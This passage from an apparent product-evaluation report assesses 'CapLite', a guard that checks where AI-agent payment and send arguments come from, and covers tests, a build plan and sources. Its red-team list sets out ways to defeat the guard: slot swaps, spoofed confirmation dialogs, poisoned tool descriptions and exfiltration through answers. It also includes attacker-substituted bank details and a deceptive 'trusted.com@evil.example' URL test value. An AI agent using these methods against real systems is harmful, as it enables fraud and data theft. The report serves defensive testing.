| B. Stated by description | "Pay my landlord the usual rent" | ALLOW via trusted record, else CONFIRM |
| C. Learned from a trusted record | "Pay the approved invoices from Acme" (vendor master) | ALLOW |
| D. Learned from an untrusted source | "Pay the invoice attached to this e-mail" | CONFIRM, with the origin shown |
| E. Attacker-substituted | Same as C or D with altered bank details | DENY or CONFIRM, never ALLOW |
| F. Wrong-slot | Two payees, two amounts, injection tries to swap | Must not ALLOW a swap in strict mode |

Add multi-turn variants, requests that contain pasted untrusted text, and agent runs triggered by an inbound ticket with no human request.

### 5.4 Property-based tests of the mediator

Use a property-testing library (Hypothesis) to generate requests, schemas, tool results and calls. The invariants:

1. **Grounding.** No ALLOW exists where an authority argument is outside the union of user-stated, confirmed and trusted-record values.
2. **Non-interference.** For a fixed request, policy and call, the verdict is identical for every possible tool-output history. This is the core security property and is directly testable.
3. **Fail closed.** Unknown tools, unknown arguments, nested objects, arrays, extra arguments not in the schema, and schema changes never produce ALLOW.
4. **Canonicalization.** Idempotent, and no two distinct identities collide. Generators must include Unicode look-alikes, zero-width characters, case variants, internationalised domains, plus-addressing, trailing dots, and URLs with userinfo such as `https://trusted.com@evil.example`.
5. **Type binding.** A value stated as one type never grounds an argument of another type.
6. **Audit equivalence.** The offline verifier reaches the same verdict as the online mediator on every generated trace (differential testing).
7. **Commitment (strict mode).** Executed writes are a subset of the committed tool set, whatever the tool outputs contain.

Add a coverage-guided fuzzer on the canonicalizers; they are the part most likely to hide a bypass.

### 5.5 Adaptive red-teaming

Because the model is outside the trusted base, red-team effort should go to the trusted base, not to prompt wording. Attack list:

- wrong-slot reuse of user-stated values;
- payload attacks that keep authority arguments intact;
- date, recurrence and permission-level manipulation;
- confirmation-dialog spoofing through attacker-controlled text shown to the approver;
- encoded or split values, and tools that accept aliases for the same field;
- poisoned tool descriptions and mid-session schema changes;
- contamination of the request (pasted content, forwarded tickets);
- multi-turn build-up of the grounding set;
- exfiltration through the final answer and through read-tool queries, to document what is not covered.

Run an internal round first, then an external round with a paid reviewer or a public challenge with the mediator as the target. Publish what is out of scope. A deterministic guard that overstates its coverage will be discredited by the first bypass write-up.

### 5.6 Shadow mode: the test that decides the business

Install the guard at design partners in log-only mode on real traffic for two weeks. It records what it would have decided and enforces nothing. This gives:

- the real confirmation rate per workflow, which no benchmark can provide;
- the share of writes whose authority values come from each origin class;
- the list of tools the schema rules cannot classify;
- measured latency in the partner's own stack.

If shadow mode shows confirmations on more than about a quarter of write calls after trusted records are configured, the product is not viable for that workflow.

### 5.7 Human study of the confirmation dialog

Twenty to thirty participants, benign and malicious confirmations mixed at a realistic ratio. Measure the approved-attack rate and time to decide, comparing a plain dialog with one that shows the value's origin. Given the 93% approval figure for permission prompts, expect this number to be uncomfortable; it sets the true security level of every CONFIRM path.

---

## 6. Go / no-go

### 6.1 Recommendation

**Do not build a company or a broad product on CapLite. Do run a 5-week validation build of a narrower thing, and stop if it misses its criteria.**

Revised score against `criteria.md` (the scout report gave 29/40):

| Criterion | Scout | Revised | Reason for change |
|---|---|---|---|
| Real pain | 4 | 4 | Unchanged. Incidents such as EchoLeak, the GitHub MCP issue hijack and the Supabase MCP leak are well documented (secondary). |
| Willingness to pay | 4 | 3 | Buyers fund gateways and governance suites. No evidence yet that they pay for this control on its own. |
| Technical leap | 4 | 3 | The idea class is strong, but CapLite's own utility is poor on capable models and at least eight concurrent systems exist. |
| Feasibility | 3 | 3 | CapLite's code was not found. ROPE's is public. The mediator is simple. |
| Time to MVP | 4 | 4 | Unchanged. |
| Market size | 4 | 4 | Unchanged. |
| Defensibility | 2 | 1 | The check is a few hundred lines and the idea is published many times over. |
| Distribution | 4 | 3 | Framework hooks exist, but incumbents already occupy them. |
| Incumbent penalty | 0 | −2 | Adjacent, not identical: AWS, Microsoft and funded startups ship deterministic argument rules. |
| **Total** | **29** | **23** | Below the 24 watchlist bar as a standalone product. |

The revised scores are my judgment. The direction is robust to a point either way on any single line.

### 6.2 The three biggest risks

1. **The rule does not fit real work.** On the paper's benchmark the best model completes 42% of tasks under CapLite against 91% undefended, and real tasks state fewer values than benchmark tasks. Widening trusted origins fixes utility but each widening is a new place for an attacker to stand. If shadow-mode confirmation rates are high, there is no product.
2. **No moat, and the neighbours are large.** AWS (Cedar at the gateway), Microsoft (open-source policy engine), Arcjet, PolicyLayer, Permit.io and the model vendors' own SDK hooks already sit where this check would run. An origin rule is a feature any of them can add. The most plausible good outcome is adoption as an open-source library and a possible acquisition or platform deal, not an independent business.
3. **The guarantee is narrower than the name suggests.** "Write firewall" will be read as "stops prompt injection". It does not cover payload text, dates and flags (unless we extend it), answers shown to the user, read-side leaks, a contaminated request, or a human who approves a malicious confirmation. The first public bypass in any of those areas damages credibility, and the confirmation path is only as strong as a user who approves 93% of prompts.

A fourth, smaller risk: the paper is a two-day-old preprint with unreleased code and no independent replication.

### 6.3 Wedge customer

**Fintech and finance-operations teams that are building agents which initiate payouts or pay supplier invoices** (accounts payable automation, payout platforms, treasury tools), at companies of roughly 50–500 engineers building on a hosted frontier model with an agent SDK.

Why this wedge:

- The loss from one bad write is direct and large, so a deterministic control is easy to justify.
- A trusted record already exists (the vendor master or payee list), so the rule "bank details must equal the trusted record" keeps confirmations low. This is the scenario where the extended rule fits best.
- The buyer already thinks in terms of dual approval and audit trails, so CONFIRM and the offline verifier map onto existing controls.
- Consumer checkout is being handled by AP2 and the card networks; business payouts are not.

Second wedge if the first stalls: teams adding external sharing or sending to an enterprise assistant, sold as a "new external recipient" control.

I have not spoken to any buyer. Whether this segment has the problem at the stated intensity is **unverified**, and the first week of the plan exists to test it.

### 6.4 Build plan (5 weeks, with a decision gate at week 3)

| Week | Build | Validate | Output |
|---|---|---|---|
| 1 | Mediator core: default-authority schema rules, fail-closed classification, typed canonicalizers (e-mail, domain, IBAN, amount with currency, URL, ID), overlay file with schema-hash pinning. Property tests 1–5. | Ten discovery calls with finance-ops and payout engineering leads. Ask what they use today and what a bad payout cost them. | Library passing property tests. Written notes from calls. |
| 2 | Adapters for two runtimes (Claude Agent SDK `PreToolUse`, OpenAI Agents SDK `needs_approval`). Trusted-record sources. Hash-chained audit log and offline verifier. Shadow mode. | AgentDojo on two frontier models and one small model, against undefended and ROPE. First AgentDyn run. | Benchmark table reported per model, three ways for confirmations. |
| 3 | Confirmation flow: out-of-band approval through Slack, origin display, plain-text rendering. Strict mode with write-tool commitment. | **Gate.** Install in shadow mode at two design partners. | Go on only if (a) at least two partners agree to shadow mode, and (b) benchmark utility with answered confirmations is within 10 points of undefended on a frontier model. |
| 4 | Fixes from shadow data. Own scenario suite for payouts (classes A–F). Fuzzer on canonicalizers. | Internal red-team round against the list in 5.5. Small confirmation-dialog user study. | Red-team report with every bypass and its fix or its scope note. |
| 5 | Documentation that states plainly what is and is not covered. Public open-source release. | Two weeks of shadow data analysed. External security review of the mediator. | Decision memo. |

**Kill criteria at week 5** (any one stops the project):

- Shadow-mode confirmation rate above 25% of write calls after trusted records are configured.
- Fewer than two design partners willing to move from shadow mode to enforcement.
- A bypass in the trusted base that cannot be fixed without a model call in the decision path.
- A shipped competitor feature that does origin-based checks. Re-check Arcjet, Microsoft's toolkit, AWS AgentCore Policy and Invariant/Snyk at week 3 and week 5.

**Continue criteria:** at least two partners enforcing in production on a payout path, a confirmation rate under 10%, and at least one partner asking to pay for hosted approvals and audit. Only then consider the hosted service.

### 6.5 If the answer is no

The cheap alternative keeps most of the learning: publish the mediator and property tests as a small open-source library and a write-up of where the user-stated rule breaks, and track ROPE, ToolFence and the CapLite code release. That costs about two weeks and preserves the option.

---

## Open items and limits of this investigation

- CapLite's code: promised in the paper, not found. Re-check in two to four weeks.
- I could not open GitHub, vendor sites or most documentation from this session. Competitor facts come from search summaries and are marked secondary. PolicyLayer pricing was not retrieved.
- The Oso acquisition claim comes from a competitor's blog and is unverified.
- CrowdStrike–Pangea, SentinelOne–Prompt Security, Proofpoint–Acuvity and OpenAI–Promptfoo were not re-verified.
- ROPE, PACT and ToolFence numbers are from their arXiv abstracts. I have not read those papers in full or run any code.
- AgentDyn figures for specific defenses come from secondary summaries.
- No customer conversations took place. Pain and willingness-to-pay scores are my inference.
- Nothing in this investigation was run against a live model. The only code executed was four read-only probes of the existing toy prototype.

---

## Sources

### Primary: papers (read in full or abstract via arXiv)
- CapLite, arXiv:2611.17115 (full text read): https://arxiv.org/abs/2611.17115 · https://arxiv.org/html/2611.17115
- ROPE, arXiv:2608.27496 (abstract): https://arxiv.org/abs/2608.27496 · code per abstract: https://github.com/xhOwenMa/ROPE (not opened)
- PACT, arXiv:2605.11039 (abstract): https://arxiv.org/abs/2605.11039
- ToolFence, arXiv:2609.37196 (abstract): https://arxiv.org/abs/2609.37196
- TraceGrant, arXiv:2608.21126 (abstract): https://arxiv.org/abs/2608.21126
- CXI, arXiv:2607.06000 (abstract): https://arxiv.org/abs/2607.06000
- Adaptive Evaluation of Out-of-Band Defenses, arXiv:2606.26479 (abstract): https://arxiv.org/abs/2606.26479
- FIDES, arXiv:2505.23643 (abstract): https://arxiv.org/abs/2505.23643
- Progent, arXiv:2504.11703 (abstract): https://arxiv.org/abs/2504.11703 · code: https://github.com/sunblaze-ucb/progent (not opened)
- CaMeL, arXiv:2503.18813 (via search summary): https://arxiv.org/abs/2503.18813 · code: https://github.com/google-research/camel-prompt-injection (not opened)
- AgentDojo, arXiv:2406.13352: https://arxiv.org/abs/2406.13352
- AgentDyn, arXiv:2602.03117 (via search summary): https://arxiv.org/abs/2602.03117
- The Attacker Moves Second, arXiv:2510.09023 (via search summary): https://arxiv.org/abs/2510.09023
- DRIFT, arXiv:2506.12104: https://arxiv.org/abs/2506.12104
- EchoLeak analysis, arXiv:2509.10540 (via search summary): https://arxiv.org/abs/2509.10540
- Benchmark taxonomy, arXiv:2605.16282 (via search summary): https://arxiv.org/abs/2605.16282

### Primary: vendor engineering post (opened)
- Anthropic, Claude Code auto mode: https://www.anthropic.com/engineering/claude-code-auto-mode

### Secondary: model-vendor documentation (via search summaries)
- Claude Agent SDK permissions: https://code.claude.com/docs/en/agent-sdk/permissions
- OpenAI Agents SDK human-in-the-loop: https://openai.github.io/openai-agents-python/human_in_the_loop
- OpenAI guardrails and human review: https://developers.openai.com/api/docs/guides/agents/guardrails-approvals
- Google Cloud MCP AI security and safety: https://docs.cloud.google.com/mcp/ai-security-safety
- MCP tool annotations blog: https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/

### Secondary: competitors (via search summaries; not opened)
- AWS, Policy in Amazon Bedrock AgentCore GA: https://aws.amazon.com/about-aws/whats-new/2026/03/policy-amazon-bedrock-agentcore-generally-available
- AWS, AgentCore Policy with Bedrock Guardrails: https://dev.classmethod.jp/en/articles/20260617-amazon-bedrock-agentcore-policy-guardrails/
- Microsoft Agent Governance Toolkit: https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit/
- PolicyLayer: https://policylayer.com/blog/mcp-gateway.md · https://policylayer.com/pricing · https://policylayer.com/compare/lasso-security · https://policylayer.com/compare/solo-io-agentgateway
- Arcjet agent guards: https://docs.arcjet.com/guards/quick-start · https://arcjet.com/learn/needsapproval-and-interrupt-are-not-a-policy · https://arcjet.com/learn/google-adk-security-guide
- Permit.io MCP Gateway: https://techintelpro.com/news/ai/agentic-ai/permitio-launches-mcp-gateway-for-secure-ai-agent-authorization
- Cerbos MCP authorization: https://cerbos.dev/blog/mcp-authorization
- Oso, agent authorization guidance: https://www.osohq.com/learn/best-practices-of-authorizing-ai-agents
- Authorization comparison: https://www.decryptiondigest.com/blog/ai-agent-fine-grained-authorization-permit-io-cerbos-oso-comparison · https://workos.com/blog/best-authorization-platforms-ai-agent-permissions-2026
- Descope MCP authentication: https://www.descope.com/blog/post/mcp-authentication-solutions
- Auth0 for AI Agents GA: https://auth0.com/blog/auth0-for-ai-agents-generally-available/
- Keycard funding: https://www.securityweek.com/keycard-emerges-from-stealth-mode-with-38-million-in-funding/
- Snyk acquires Invariant Labs: https://snyk.io/news/snyk-acquires-invariant-labs-to-accelerate-agentic-ai-security-innovation · https://siliconangle.com/2025/06/24/snyk-acquires-invariant-labs-expand-ai-agent-security-capabilities/
- agentgateway MCP authorization: https://agentgateway.dev/docs/standalone/latest/configuration/security/mcp-authz/
- Docker MCP Gateway: https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/
- Cloudflare MCP server portals: https://blog.cloudflare.com/zero-trust-mcp-server-portals · https://developers.cloudflare.com/cloudflare-one/access-controls/ai-controls/mcp-portals
- Runlayer funding: https://techcrunch.com/2025/11/17/mcp-ai-agent-security-startup-runlayer-launches-with-8-unicorns-11m-from-khoslas-keith-rabois-and-felicis · https://www.hpcwire.com/bigdatawire/this-just-in/runlayer-raises-30m-series-a-to-help-enterprises-become-ai-native/
- Zenity inline runtime security: https://www.businesswire.com/news/home/20260317981139/en/Zenity-Announces-Availability-of-Inline-Agent-Runtime-Security-for-Agents-Built-on-Microsoft-Foundry · https://zenity.io/blog/product/securing-homegrown-agents-in-runtime-zenity-microsoft-foundry
- Lasso, Operant, Pillar roundups: https://aembit.io/blog/top-9-mcp-security-platforms-and-gateways-in-2026/ · https://www.mintmcp.com/blog/operant-ai-mcp-gateway-alternatives · https://www.truefoundry.com/blog/lasso-security-alternatives
- Check Point – Lakera: https://www.securityweek.com/check-point-to-acquire-ai-security-firm-lakera/ · https://en.globes.co.il/en/article-1001521951
- Google ADK security write-up: https://neuraltrust.ai/blog/google-adk-security

### Secondary: incidents, payments rails, approval fatigue
- Supabase MCP and the lethal trifecta (Simon Willison): https://simonwillison.net/2025/Jul/6/supabase-mcp-lethal-trifecta/ · https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Supabase MCP leak analysis: https://generalanalysis.com/blog/supabase-mcp-blog
- GitHub MCP toxic agent flow (Invariant Labs): https://invariantlabs.ai/blog/mcp-github-vulnerability
- Google AP2: https://venturebeat.com/ai/googles-new-agent-payments-protocol-ap2-allows-ai-agents-to-complete · https://www.americanbanker.com/payments/news/what-banks-need-to-know-about-googles-ai-agent-protocol
- Agent payment protocols compared: https://blockeden.xyz/blog/2026/03/14/payment-giants-agent-protocol-war-visa-tap-google-ap2-coinbase-x402-paypal-ai-commerce/
- Agent permissions and approval fatigue: https://workos.com/blog/agent-permissions-blast-radius

### Local
- `/home/user/paper-scout/reports/2026-11-14.md` (initial scout report)
- `/home/user/paper-scout/prototypes/2026-11-14-write-guard/` (toy prototype; probed read-only)
